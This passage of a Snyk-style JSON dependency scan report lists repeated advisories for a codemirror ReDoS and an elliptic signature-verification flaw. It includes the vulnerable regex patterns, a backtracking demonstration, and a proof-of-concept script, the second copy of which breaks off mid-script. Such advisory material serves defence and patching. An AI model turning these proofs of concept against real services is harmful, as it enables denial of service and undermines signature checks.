        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "ShiyuBanzhou"
        ],
        "semver": {
          "vulnerable": [
            "<6.0.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "6.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "codemirror",
        "references": [
          {
            "url": "https://github.com/codemirror/codemirror5/issues/7128",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L521",
            "title": "Vulnerable Code"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L537",
            "title": "Vulnerable Code"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L634",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-06-23T01:13:13.444153Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-06-23T05:33:45.943527Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-08-27T07:47:56.769324Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-08-27T07:47:56.769324Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-23T01:13:13.444153Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-23T05:33:45.943527Z"
          }
        ],
        "description": "## Overview\n[codemirror](https://www.npmjs.com/package/codemirror) is a versatile text editor implemented in JavaScript for the browser.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via multiple locations in `markdown.js`. An attacker can cause excessive resource consumption by submitting a crafted Markdown input that triggers inefficient regular expression processing, causing the editor (or associated service) to freeze the CPU.\r\n\r\n**Note:** The GitHub issue associated with the vulnerability refers to multiple problematic regex patterns; those patterns were introduced, in part, starting from version 2.33.0:\r\n\r\n- `/\\[[^\\]]*\\] ?(?:\\(|\\[)/` introduced in 3.15.0\r\n\r\n- `/\\[[^\\]]*\\] ?(?:\\(|\\[)/` introduced in 3.11.0\r\n\r\n- `/\\(.*?\\)| ?\\[.*?\\]/` introduced in 5.15.0\r\n\r\n- `/^[^> \\\\]+@(?:[^\\\\>]|\\\\.)+>/` introduced in 2.33.0\r\n\r\n- `/[^\\]]*\\](\\(.*\\)| ?\\[.*?\\])/` introduced in 5.15.0\r\n\r\nWhile the issue was reported for version 5.17.0, those patterns still exist in recent versions of the package except 6.x.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `codemirror` to version 6.0.0 or higher.\n## References\n- [GitHub Issue](https://github.com/codemirror/codemirror5/issues/7128)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L521)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L537)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L634)\n",
        "epssDetails": {
          "percentile": "0.18538",
          "probability": "0.00058",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-6493"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-pff4-9qxc-79mq"
          ]
        },
        "packageName": "codemirror",
        "proprietary": false,
        "creationTime": "2025-06-23T14:27:04.147607Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-06-22T22:40:45Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-06-23T15:38:56.429973Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-08-27T07:47:56.769324Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "frontend@19.0.0",
          "codemirror@5.65.20"
        ],
        "upgradePath": [
          false,
          "codemirror@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "codemirror",
        "version": "5.65.20"
      },
      {
        "id": "SNYK-JS-CODEMIRROR-10494092",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "ShiyuBanzhou"
        ],
        "semver": {
          "vulnerable": [
            "<6.0.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "6.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "codemirror",
        "references": [
          {
            "url": "https://github.com/codemirror/codemirror5/issues/7128",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L521",
            "title": "Vulnerable Code"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L537",
            "title": "Vulnerable Code"
          },
          {
            "url": "https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js%23L634",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-06-23T01:13:13.444153Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-06-23T05:33:45.943527Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-08-27T07:47:56.769324Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-08-27T07:47:56.769324Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-23T01:13:13.444153Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-23T05:33:45.943527Z"
          }
        ],
        "description": "## Overview\n[codemirror](https://www.npmjs.com/package/codemirror) is a versatile text editor implemented in JavaScript for the browser.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via multiple locations in `markdown.js`. An attacker can cause excessive resource consumption by submitting a crafted Markdown input that triggers inefficient regular expression processing, causing the editor (or associated service) to freeze the CPU.\r\n\r\n**Note:** The GitHub issue associated with the vulnerability refers to multiple problematic regex patterns; those patterns were introduced, in part, starting from version 2.33.0:\r\n\r\n- `/\\[[^\\]]*\\] ?(?:\\(|\\[)/` introduced in 3.15.0\r\n\r\n- `/\\[[^\\]]*\\] ?(?:\\(|\\[)/` introduced in 3.11.0\r\n\r\n- `/\\(.*?\\)| ?\\[.*?\\]/` introduced in 5.15.0\r\n\r\n- `/^[^> \\\\]+@(?:[^\\\\>]|\\\\.)+>/` introduced in 2.33.0\r\n\r\n- `/[^\\]]*\\](\\(.*\\)| ?\\[.*?\\])/` introduced in 5.15.0\r\n\r\nWhile the issue was reported for version 5.17.0, those patterns still exist in recent versions of the package except 6.x.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `codemirror` to version 6.0.0 or higher.\n## References\n- [GitHub Issue](https://github.com/codemirror/codemirror5/issues/7128)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L521)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L537)\n- [Vulnerable Code](https://github.com/codemirror/codemirror5/blame/8a5dcbb838e06fa01cba4d0b74d988ab66821c33/mode/markdown/markdown.js#L634)\n",
        "epssDetails": {
          "percentile": "0.18538",
          "probability": "0.00058",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-6493"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-pff4-9qxc-79mq"
          ]
        },
        "packageName": "codemirror",
        "proprietary": false,
        "creationTime": "2025-06-23T14:27:04.147607Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-06-22T22:40:45Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-06-23T15:38:56.429973Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-08-27T07:47:56.769324Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "frontend@19.0.0",
          "codemirror-solidity@0.2.5",
          "codemirror@5.65.20"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "codemirror",
        "version": "5.65.20"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC 